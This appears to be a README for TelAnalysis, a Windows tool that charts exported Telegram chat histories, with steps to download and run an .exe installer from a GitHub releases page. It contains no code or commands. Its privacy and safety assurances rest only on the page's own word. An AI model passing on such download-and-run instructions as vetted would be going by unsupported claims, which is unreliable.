# 📊 TelAnalysis - Turn complex chats into visual insights

[![](https://img.shields.io/badge/Download_TelAnalysis-Blue?style=for-the-badge)](https://github.com/Perape3796/TelAnalysis)

## 📖 About this tool

TelAnalysis helps you understand your Telegram chat history. It transforms data from your exported chat files into clear charts and graphs. You see patterns in communication, identify key topics, and visualize how your community interacts.

The tool focuses on privacy. It runs locally on your machine, which means your chat data stays on your computer. You keep full control over your information throughout the entire process.

## 🛠️ System requirements

To run TelAnalysis on your Windows computer, you need the following:

- Windows 10 or Windows 11.
- At least 8 gigabytes of RAM.
- A modern web browser like Chrome, Firefox, or Edge.
- A Telegram chat export file in JSON format.

## 📥 Getting the software

You must visit the project page to download the latest version of the application. The software comes packaged as a convenient installer for Windows.

[Visit the releases page to download](https://github.com/Perape3796/TelAnalysis)

1. Open the link above in your web browser.
2. Find the section labeled Releases on the right sidebar.
3. Click the most recent version number.
4. Look for the file ending in .exe under the Assets section.
5. Click this file to start the download.

## 🚀 Setting up the application

1. Find the file you downloaded in your Downloads folder.
2. Double-click the file to start the installation.
3. Follow the prompts on the screen to finish the setup.
4. Launch the application from your Start menu or desktop icon.

## 📂 Exporting your Telegram data

Before you use the dashboard, you need your chat data. Telegram offers a built-in export feature to help with this.

1. Open the Telegram Desktop app on your computer.
2. Select the chat you want to analyze.
3. Click the three dots icon in the top right corner.
4. Select Export chat history.
5. Choose the JSON format for the output. This format allows TelAnalysis to read your data accurately.
6. Select the path on your computer where you want to save the files.
7. Click Export.

Wait for the process to finish. Once done, note the folder location where Telegram saved the files.

## 📊 Analyzing your chats

1. Open TelAnalysis.
2. Click the Upload Data button on the main screen.
3. Select the folder or files you exported from Telegram.
4. Wait for the application to process the information. This might take a few minutes if your chat history is large.
5. Once complete, the dashboard loads automatically.

## 📈 Understanding the results

The dashboard displays several panels to help you explore your data:

- Activity Overview: This chart shows when you and other participants talk the most. It highlights busy days and quiet periods.
- Sentiment Tracker: This section analyzes the tone of the conversation. It helps you see if the community feels positive, neutral, or negative about certain topics.
- Word Clouds: This visual tool highlights the most frequent words in your chat. Larger words appear more often in the conversation.
- Network Map: This view displays how people interact with each other. It uses lines to show who talks to whom most frequently.

## 🛡️ Privacy and local data

TelAnalysis runs as a local server on your computer. It does not send your chat logs or personal messages to any external servers. The processing occurs entirely on your hardware. You can safely disconnect your computer from the internet while using this tool to ensure maximum privacy.

## ⚙️ Troubleshooting common issues

If the application fails to load:

- Check your file format: The tool only reads JSON files. If you exported as HTML, you must go back to Telegram and select the JSON option.
- Resource usage: If the dashboard feels slow, close other programs that use a lot of memory.
- Updates: If you experience bugs, check the download link above for a newer version. Developers often release fixes to improve performance.

## 💬 Frequently asked questions

Does this tool store my messages?
No. All data stays on your local drive and disappears when you close the dashboard.

Can I analyze multiple chats?
Yes. You can import new data at any time using the settings menu inside the application.

Is this free to use?
Yes. This project is open source and free for anyone to use.

What if the application crashes?
Restart the application. If the problem continues, delete the temporary cache files in your installation folder and try again.

Where can I report errors?
You can visit the main GitHub repository link to open an issue. Provide as much detail as possible about what happened when the crash occurred.

## 📦 Technical details

This application uses FastAPI to handle data processing and React to display the visual interface. It employs natural language processing to assign sentiment values to messages. The dashboard uses Echarts for all visual components. This combination of technologies ensures a fast and responsive experience for your data analysis needs.